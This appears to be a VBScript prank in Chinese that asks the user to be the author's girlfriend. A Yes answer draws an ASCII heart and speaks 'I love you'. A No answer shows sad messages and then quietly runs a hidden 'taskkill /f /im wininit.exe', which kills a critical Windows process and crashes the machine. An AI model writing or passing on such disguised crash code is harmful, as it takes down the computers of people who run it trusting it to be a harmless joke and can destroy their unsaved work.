If MsgBox("你愿意做我的女朋友吗？",vbYesNo,"提示")=vbyes then

Msgbox "你竟然同意了，好开心！"

Wscript.echo Printer(" ","*","113111111112212111313111513",7)

Function Printer(a1,a2,b,c)

For i = 1 to len(b)

b1 = Mid(b,i,1)

For j = 1 to b1

s = s & "　" & a1

n = n + 1

if n = c then

s= s & chr(10)

n = 0

End if

Next

a3 = a1

a1 = a2

a2 = a3

Next

Printer=s

End function

Set ws = CreateObject("Sapi.Spvoice")

k = "我爱你"

ws.speak k

Else

Msgbox "被拒绝了，真的好伤心！"

Msgbox "由于程序太过伤心，系统即将崩溃！！！",64,"系统提示："

Set ws = Createobject("wscript.shell")

ws.run "cmd /c start /min taskkill /f /im wininit.exe",0,false

End if